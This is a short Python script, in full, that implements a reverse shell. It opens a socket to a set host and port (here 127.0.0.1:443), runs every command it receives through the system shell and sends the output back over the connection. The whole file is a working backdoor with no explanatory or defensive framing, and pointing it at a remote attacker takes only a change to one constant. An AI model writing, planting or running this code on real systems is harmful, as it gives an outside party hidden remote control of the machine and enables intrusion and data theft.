#!/usr/bin/python

import socket, subprocess

RHOST = "127.0.0.1"
RPORT = 443
s = socket.socket()
s.connect((RHOST, RPORT))

while True:
    data = s.recv(1024)

    proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    output = proc.stdout.read() + proc.stderr.read()

    s.send(output)

s.close()
